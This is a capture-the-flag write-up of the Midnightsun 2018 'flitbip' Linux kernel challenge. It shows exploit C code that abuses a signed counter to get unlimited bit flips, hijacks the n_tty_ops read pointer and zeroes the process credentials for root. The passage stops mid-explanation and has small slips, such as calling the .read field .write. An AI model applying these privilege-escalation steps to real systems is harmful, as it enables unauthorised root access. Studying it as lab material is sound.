# Midnightsun CTF Finals 2018
## analysis

there is no kernel module but a user-defined syscall. The source code is 

```c
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/syscalls.h>

#define MAXFLIT 1

#ifndef __NR_FLITBIP
#define FLITBIP 333
#endif

long flit_count = 0;
EXPORT_SYMBOL(flit_count);

SYSCALL_DEFINE2(flitbip, long *, addr, long, bit)
{
        if (flit_count >= MAXFLIT)
        {
                printk(KERN_INFO "flitbip: sorry :/\n");
                return -EPERM;
        }

        *addr ^= (1ULL << (bit));
        flit_count++;

        return 0;
}
```

the source code is simple: give the syscall an address and an index, the syscall will flip the bit at the address. So the exploit is about abusing the this user defined syscall



the run.sh is as follow

```bash
#!/bin/bash
qemu-system-x86_64 \
    -s \
    -m 128M \
    -kernel ./bzImage \
    -initrd ./initrd \
    -nographic \
    -monitor /dev/null \
    -append "nokaslr root=/dev/ram rw console=ttyS0 oops=panic paneic=1 quiet" 2>/dev/null

```

there is barely no protection. No smep indicate that us may hijack a function pointer and return to user space code.



### vulnerability

by definition of the syscall, the bit flip operation is allowed only once, by compareing a global variable *flit_count* with *MAXFLIT* which equals 1. However, the variable *flit_count* is defined as a long signed int. So it's possible to flip the first bit of this variable, making it negative to allow us to bypass the check and flip bits as many times as we want, which in some way equals **arbitrary memory write**.

Next we will hijack a function pointer in *tty_operation*, overwrite it to our user space code, which will overwrite the *cred* struct of current process and spawn a root shell by *iretq*



## exploit

since *kalsr* is disabled according to the run.sh, all global variables will be load at fix addresses. By adding a line in the init file

```sh
#!/bin/sh

mount -t devtmpfs none /dev
mount -t proc none /proc
mount -t sysfs none /sys

/sbin/mdev -s

chown -R root.root / > /dev/null 2>&1
chown flitbip.flitbip /home/flitbip

HOME=/home/flitbip
ENV=$HOME/.profile; export ENV

cat <<EOF
                                                   Midnight Sun CTF presents...

                 ███████╗     ██╗██╗████████╗ ██████╗██╗██████╗ 
                 ╚════██║     ██║██║╚══██╔══╝██╔══██║██║██╔══██╗
                   █████║     ██║██║   ██║   ╚██████║██║██████╔╝
                   ╚══██║     ██║██║   ██║   ██╔══██║██║██╔═══╝ 
                      ██║███████║██║   ██║   ╚██████║██║██║     
                      ╚═╝╚══════╝╚═╝   ╚═╝    ╚═════╝╚═╝╚═╝     
══════════════════════════════════════════════════════════════════════════════╗
EOF

cat /src/flitbip.c

cat <<EOF
══════════════════════════════════════════════════════════════════════════════╝
EOF
# add this line to save kallsyms
cat /proc/kallsyms > /kallsyms
setsid cttyhack setuidgid 1000 /bin/sh

echo -ne "\n"
echo "Bye!"

umount /dev
umount /proc
umount /sys

poweroff -d 0 -f

```

we save global variables load address in /kallsyms, and read them after booting the kernel

```c
unsigned long flit_count_addr = 0xffffffff818f4f78;
unsigned long current_task_addr = 0xffffffff8182e040;
unsigned long n_tty_ops = 0xffffffff8183e320;
unsigned long n_tty_ops_read = 0xffffffff8183e350;
unsigned long n_tty_read = 0xffffffff810c8510;
```



then we overwrite the first bit of *flit_count_addr* to bypass the flip count limit

```c
void flitbip(void* addr, long int bit){
    syscall(333, addr, bit);
}

int main(){
    save_state(state);
    flitbip((void*)flit_count_addr, 63);
```

next we will hijack a function pointer in kernel, making it point to our user space code *get_root*, and the kernel will jump to our code with privillege 0(no SMEP) when the function pointer is called. Then we overwrite the *cred* struct of the current process to achieve privillege escalation

```c
volatile void get_root(void){
    // hang();
    int* cred = (int*)(*(unsigned long*)(*(unsigned long*)current_task_addr + 0x3c0));
    for(int i=0;i<9;i++) cred[i] = 0;
    *(unsigned long*)n_tty_ops_read = (unsigned long)n_tty_read;
    ret2user_shellcode(state.ss, state.sp, state.rflag, state.cs, spawn_shell);
}
```



### which function pointer to hijack

during the process of kernel init, the *start_kernel()* calls *console_init()* to allocate and init a tty struct for console tty. The *console_init()* calls *n_tty_init()* to set tty_operation for the tty struct. In *n_tty_init()*, it set the tty_operation field of the console tty struct to a global struct variable *n_tty_ops*, which is defined as

```c
static struct tty_ldisc_ops n_tty_ops = {
	.magic           = TTY_LDISC_MAGIC,
	.name            = "n_tty",
	.open            = n_tty_open,
	.close           = n_tty_close,
	.flush_buffer    = n_tty_flush_buffer,
	.read            = n_tty_read,
	.write           = n_tty_write,
	.ioctl           = n_tty_ioctl,
	.set_termios     = n_tty_set_termios,
	.poll            = n_tty_poll,
	.receive_buf     = n_tty_receive_buf,
	.write_wakeup    = n_tty_write_wakeup,
	.receive_buf2	 = n_tty_receive_buf2,
};
```

the function pointers in the struct are also global variables, which is easy for us to hijack with KALSR disabled. So here we can hijack the *n_tty_read* in the *n_tty_ops*, overwrite it to our user space code. The tty_read operation can be triggered simply by a *scanf()*.



### overwriting *n_tty_ops*

the address of *n_tty_ops* struct and *n_tty_read* are read from *kallsyms*, we can overwrite the *.write* field by calling the syscall *flitbip*, implemented as follow

```c
unsigned long diff;
    diff = n_tty_read ^ (unsigned long)get_root;
    for(int i=0;i<64;i++){
        if(diff & (((unsigned long)1)<<i)){
            flitbip((void*)n_tty_ops_read, i);
        }
    }
```



### overwriting the *cred* field in current *task_struct*

*task_struct* is define as

```c
struct task_struct {
#ifdef CONFIG_THREAD_INFO_IN_TASK
	struct thread_info		thread_info;
#endif
	volatile long			state;

	randomized_struct_fields_start

	void				*stack;
	atomic_t			usage;
    
    .....
        
    /* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;
    
    /* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;
    
    /* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
    
    .....
}
```

the *cred* field point to a *cred* struct, which is defined as

```c
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
    
    .....
        
}
```

by overwriting the bunch of *kuid_t* and *kgid_t* fields to 0, we can achieve privillege escalation. But how?



#### implementation

when arriving at this stage, the call trace will be like

> scanf() ----- syscall(read) ----- console_tty->tty_ops->write() ----- get_root()

so we will be in privillege 0. All we need to know is the *task_struct* address in the kernel space and the relative fields offsets. Then we simply write those corresponding fields, acturely memory addresses.



**task_struct address in kernel space**

there is a global variable called *current_process*, which always points to the current process's task struct in kernel space. The address of *current_process* can be read from kallsyms, and we can get the address of the current process's task struct by derefferencing the *current_process* pointer.



**fields offsets**

the two structs are complicated 



